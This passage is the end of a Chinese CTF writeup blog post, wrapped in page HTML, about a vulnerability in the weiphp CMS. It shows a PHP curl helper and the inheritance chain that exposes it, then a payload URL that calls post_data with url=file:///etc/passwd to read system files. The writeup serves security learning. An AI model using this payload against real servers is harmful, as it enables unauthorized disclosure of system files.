<span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($useCert[<span class="string">'certPath'</span>]) &amp;&amp; <span class="keyword">isset</span>($useCert[<span class="string">'keyPath'</span>])) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERTTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERT, $useCert[<span class="string">'certPath'</span>]);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEYTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEY, $useCert[<span class="string">'keyPath'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        add_debug_log($res, <span class="string">'post_data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo $res;die;</span></span><br><span class="line">    $flat = curl_errno($ch);</span><br><span class="line"></span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">        $msg = curl_error($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// add_request_log($url, $param, $res, $flat, $msg);</span></span><br><span class="line">    <span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'curl_erron'</span> =&gt; $flat,</span><br><span class="line">            <span class="string">'curl_error'</span> =&gt; $msg</span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($return_array &amp;&amp; !<span class="keyword">empty</span>($res)) &#123;</span><br><span class="line">            $res = $type == <span class="string">'json'</span> ? json_decode($res, <span class="keyword">true</span>) : FromXml($res);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找一下谁继承了Base</p>
+<p>可以找到</p>
+<blockquote>
+<p>class User extends Home   -&gt;   class Home extends WebBase  -&gt;   class WebBase extends Base</p>
+</blockquote>
+<p>那么直接模块为User  执行post_data方法</p>
+<p>payload</p>
+<blockquote>
+<p><a href="http://127.0.0.1/weiphp5.0/public/index.php/home/user/post_data?url=file:///etc/passwd&param=&type=file" target="_blank" rel="noopener">public/index.php/home/user/post_data?url=file:///etc/passwd&amp;param=&amp;type=file</a></p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579262419262-e268c364-e113-4efb-97e6-9a3fc2f5242e.png#align=left&display=inline&height=864&name=image.png&originHeight=864&originWidth=1504&size=384476&status=done&style=none&width=1504" alt="image.png"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Imtinmin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> WEB</a>
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/17/2020-1-17-SUM/" rel="next" title="2019总结">
+      2019总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babypress"><span class="nav-number">2.</span> <span class="nav-text">babypress</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#noxss"><span class="nav-number">3.</span> <span class="nav-text">noxss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载最新的docker-compose"><span class="nav-number">3.1.</span> <span class="nav-text">下载最新的docker-compose</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#weiphp"><span class="nav-number">4.</span> <span class="nav-text">weiphp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Arbitrary-File-Upload"><span class="nav-number">4.1.</span> <span class="nav-text">Arbitrary File Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">4.2.</span> <span class="nav-text">CSRF</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Imtinmin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imtinmin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imtinmin" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Imtinmin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
